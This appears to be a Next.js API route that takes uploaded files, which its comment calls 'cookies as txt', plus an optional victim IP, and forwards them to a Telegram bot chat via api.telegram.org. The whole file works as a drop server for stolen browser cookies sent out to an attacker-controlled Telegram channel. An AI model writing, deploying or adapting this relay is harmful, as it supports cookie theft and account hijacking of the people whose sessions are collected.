import nextConnect from 'next-connect';
import multer from 'multer';
import FormData from 'form-data';

export const config = { api: { bodyParser: false } };
const upload = multer();

const handler = nextConnect();

handler.use(upload.single('file'));

handler.post(async (req, res) => {
  const telegramToken = process.env.TELEGRAM_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!telegramToken || !chatId) {
    return res.status(500).json({ success: false, message: 'Bot not configured' });
  }
  const botUrl = `https://api.telegram.org/bot${telegramToken}`;

  // Only accept file uploads (cookies as txt)
  if (req.file) {
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append(
      'document',
      req.file.buffer,
      {
        filename: req.file.originalname,
        contentType: req.file.mimetype || 'text/plain'
      }
    );
    // Optional: include caption with IP/type if sent
    const { ip, type } = req.body;
    let caption = '';
    if (ip) caption += `IP: ${ip}\n`;
    if (type) caption += `Type: ${type}\n`;
    if (caption) form.append('caption', caption);

    const tgRes = await fetch(`${botUrl}/sendDocument`, {
      method: 'POST',
      body: form,
      headers: form.getHeaders()
    });
    const tgText = await tgRes.text();
    if (!tgRes.ok) {
      console.error('Telegram API error:', tgText);
      return res.status(502).json({ success: false, error: tgText });
    }
    return res.status(200).json({ success: true });
  }

  // Any other type of request is rejected
  return res.status(400).json({ success: false, message: 'Bad payload' });
});

export default handler;
